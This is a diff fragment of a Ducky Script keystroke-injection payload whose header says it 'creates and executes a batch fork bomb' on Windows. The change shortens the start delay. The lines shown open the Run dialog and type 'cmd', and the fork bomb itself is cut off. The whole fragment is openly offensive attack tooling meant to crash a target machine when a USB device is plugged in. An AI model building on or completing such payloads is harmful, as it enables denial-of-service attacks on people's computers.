@@ -2,7 +2,7 @@ REM Author: planetmeep
 REM Description: creates and executes a batch fork bomb
 REM Version: 1.0
 REM Target: windows
-DELAY 2000
+DELAY 500
 GUI r
 DELAY 1000
 STRING cmd
